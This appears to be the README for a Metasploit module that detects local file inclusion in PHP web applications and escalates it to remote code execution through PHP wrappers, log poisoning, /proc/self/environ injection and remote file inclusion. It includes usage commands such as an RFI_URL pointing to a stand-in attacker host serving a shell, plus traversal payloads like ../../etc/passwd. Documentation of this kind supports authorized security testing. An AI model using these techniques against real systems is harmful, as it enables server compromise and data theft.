# Auto LFI to RCE Converter - Metasploit Module

## 📋 Description

This Metasploit auxiliary module automatically detects Local File Inclusion (LFI) vulnerabilities in web applications and attempts to escalate them to Remote Code Execution (RCE) using various techniques. It's designed for penetration testers and security researchers conducting authorized security assessments.

## ✨ Features

- **Multi-vector LFI Detection**: Tests multiple LFI patterns including directory traversal, PHP wrappers, and Windows paths
- **Automatic RCE Escalation**: Attempts to convert found LFI vulnerabilities to RCE using 4 different methods
- **PHP Wrapper Exploitation**: Tests php://input, php://filter, data://, and expect:// wrappers
- **Log Poisoning**: Injects malicious code into Apache, Nginx, and system logs
- **/proc/self/environ Injection**: Uses HTTP headers to inject PHP code into environment variables
- **RFI Testing**: Checks for Remote File Inclusion when allow_url_include is enabled
- **Comprehensive Reporting**: Creates detailed notes and vulnerability records in Metasploit database




🚀 Usage
Basic Scan
use auxiliary/scanner/http/lfi2rce
set RHOSTS target.com
set TARGETURI /index.php?page=
run

Advanced Options
set TARGETURI /site/page.php?file=
set PARAMETER file
set RFI_URL http://attacker.com/shell.txt
set THREADS 20
set CHECK_WRAPPERS true
set CHECK_LOGS true
set CHECK_ENVIRON true
set CHECK_RFI true
run

🎯 How It Works
1. LFI Detection Phase
The module tests multiple payloads to identify LFI vulnerabilities:

Directory traversal patterns (../../etc/passwd)

PHP wrappers (php://filter)

Windows paths (..\windows\win.ini)

System files (/proc/self/environ)

2. RCE Escalation Phase
Once an LFI is found, it attempts to gain RCE through:

PHP Wrappers
php://input - POST data injection

php://filter - Base64 decode wrappers

data:// - Base64 encoded PHP code

expect:// - Direct command execution (if enabled)

Log Poisoning
Injects PHP code into various log files via User-Agent and Referer headers, then executes commands by including the poisoned logs.

/proc/self/environ Injection
Uses HTTP headers to inject PHP code into environment variables displayed in /proc/self/environ.

Remote File Inclusion
Tests for RFI when allow_url_include is enabled in PHP configuration.
⚙️ Requirements
Metasploit Framework (tested on version 6.x)

Target with PHP-based LFI vulnerability

Network access to target

For RCE: PHP environment with appropriate configurations

📝 Notes
This module is for authorized security testing only

Some techniques require specific PHP configurations (allow_url_include, expect module)

Log poisoning may leave traces in target system logs

Always obtain proper authorization before testing

🔗 References
CWE-98: Improper Control of Filename for Include/Require Statement

CWE-73: External Control of File Name or Path

PHP Wrappers Documentation

OWASP LFI Testing Guide

⚠️ Disclaimer
This tool is for educational and authorized security testing purposes only. Users are responsible for compliance with applicable laws and regulations. The author assumes no liability for misuse or damage caused by this program.

📄 License
This module is part of the Metasploit Framework and is licensed under the same terms.



## 🔧 Installation

1. Save the module to your Metasploit modules directory:
```bash
mkdir -p ~/.msf4/modules/auxiliary/scanner/http/
cp lfi2rce.rb ~/.msf4/modules/auxiliary/scanner/http/


Start Metasploit and reload modules:

msfconsole
reload_all
